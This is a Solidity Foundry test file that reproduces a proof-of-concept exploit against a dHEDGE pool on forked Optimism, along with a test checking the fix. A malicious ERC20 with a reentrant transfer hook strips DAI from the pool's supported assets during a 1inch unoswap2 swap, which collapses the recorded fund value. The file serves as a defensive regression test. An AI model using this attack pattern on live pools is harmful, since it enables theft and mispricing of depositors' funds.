// SPDX-License-Identifier: MIT
// solhint-disable one-contract-per-file
pragma solidity >=0.7.6 <0.9.0;
pragma abicoder v2;

import {EthereumConfig} from "test/integration/utils/foundry/config/EthereumConfig.sol";
import {OptimismConfig} from "test/integration/utils/foundry/config/OptimismConfig.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Test} from "forge-std/Test.sol";

import {Governance} from "contracts/Governance.sol";
import {PoolLogic} from "contracts/PoolLogic.sol";
import {PoolManagerLogic} from "contracts/PoolManagerLogic.sol";
import {IERC20} from "contracts/interfaces/IERC20.sol";
import {OneInchV6Guard} from "contracts/guards/contractGuards/OneInchV6Guard.sol";
import {IUniswapV2Factory} from "contracts/interfaces/uniswapV2/IUniswapV2Factory.sol";
import {IAggregationRouterV6} from "contracts/interfaces/oneInch/IAggregationRouterV6.sol";
import {SlippageAccumulator} from "contracts/utils/SlippageAccumulator.sol";
import {IUniswapV2Router} from "contracts/interfaces/uniswapV2/IUniswapV2Router.sol";

contract OneInchV6DstTokenTest is Test {
  IAggregationRouterV6 public router = IAggregationRouterV6(EthereumConfig.ONE_INCH_V6_ROUTER);
  IERC20 public weth = IERC20(OptimismConfig.WETH);
  IERC20 public dai = IERC20(OptimismConfig.DAI);

  PoolLogic public pool = PoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
  PoolManagerLogic public manager = PoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
  address public managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;

  IUniswapV2Router public uniRouter = IUniswapV2Router(OptimismConfig.UNISWAP_V2_ROUTER);
  IUniswapV2Factory public uniFactory = IUniswapV2Factory(0x0c3c1c532F1e39EdF36BE9Fe0bE1410313E074Bf);

  Governance public dHEDGEGovernance = Governance(0xa9F912c1dB1b844fd96192Ac3B496E9d8F445bc9);
  address public dHEDGEAdminOptimism = 0x90b1a66957914EbbE7a8df254c0c1E455972379C;

  function setUp() public {
    vm.createSelectFork("optimism", 121303383);

    deal(address(weth), address(managerAddress), 100 ether);
    deal(address(dai), address(managerAddress), 500000e18);
  }

  function test_remove_dst_token_during_execute_poc() public {
    bytes memory data = _executeScenario();

    pool.execTransaction(address(router), data);
    assertEq(43.964297348421959993e18, manager.totalFundValue()); // $43 tvl
  }

  function test_remove_dst_token_during_execute_fix() public {
    address slippageAccumulator = address(new SlippageAccumulator(OptimismConfig.POOL_FACTORY_PROD, 86400, 10e4));
    address newOneInchV6Guard = address(
      new OneInchV6Guard(
        slippageAccumulator,
        uniFactory,
        IUniswapV3Factory(OptimismConfig.UNISWAP_V3_FACTORY),
        address(0)
      )
    );
    vm.prank(dHEDGEAdminOptimism);
    dHEDGEGovernance.setContractGuard(address(router), newOneInchV6Guard);

    bytes memory data = _executeScenario();

    vm.expectRevert("unsupported destination asset");
    pool.execTransaction(address(router), data);
  }

  function _executeScenario() internal returns (bytes memory data) {
    PoolManagerLogic.Asset[] memory assets = new PoolManagerLogic.Asset[](1);
    assets[0].asset = address(dai);

    vm.startPrank(managerAddress);
    manager.changeAssets(assets, new address[](0)); // adding dai as supported token

    MaliciousERC20 malToken = new MaliciousERC20();
    deal(address(malToken), address(managerAddress), 1e24);

    weth.approve(address(uniRouter), 1e18);
    dai.approve(address(uniRouter), 500000e18);
    malToken.approve(address(uniRouter), 1e24);
    uniRouter.addLiquidity(address(weth), address(malToken), 1e18, 1000e18, 0, 0, managerAddress, block.timestamp);
    uniRouter.addLiquidity(address(dai), address(malToken), 500000e18, 1e6, 0, 0, managerAddress, block.timestamp);
    address pair1 = uniFactory.getPair(address(weth), address(malToken));
    address pair2 = uniFactory.getPair(address(dai), address(malToken));

    deal(address(weth), address(pool), 10 ether);
    manager.setTrader(address(malToken));

    data = abi.encodeWithSelector(weth.approve.selector, address(router), 100e18);
    // Execute the transaction
    pool.execTransaction(address(weth), data);
    assertEq(weth.allowance(address(pool), address(router)), 100e18);

    assertEq(36259.841297348421959993e18, manager.totalFundValue()); // $36k tvl
    malToken.setUpAttack();
    uint256 pairValue = uint256(uint160(pair1)) + 2 ** 247;
    uint256 pairValue2 = uint256(uint160(pair2)) + 2 ** 247;
    data = abi.encodeWithSelector(
      IAggregationRouterV6.unoswap2.selector,
      uint256(uint160(address(weth))),
      10e18,
      40000e18,
      pairValue,
      pairValue2
    );
  }
}

contract MaliciousERC20 is ERC20, Test {
  PoolManagerLogic public manager = PoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
  PoolLogic public pool = PoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
  IERC20 public dai = IERC20(OptimismConfig.DAI);

  address public attackSender = address(1001);
  bool public attk;

  constructor() ERC20("", "") {}

  function setUpAttack() public {
    attk = true;
  }

  function transfer(address receiver, uint256 amount) public override returns (bool) {
    if (attk) {
      address[] memory addrs = new address[](1);
      addrs[0] = address(dai);

      manager.changeAssets(new PoolManagerLogic.Asset[](0), addrs);

      attk = false;
    }

    return super.transfer(receiver, amount);
  }
}
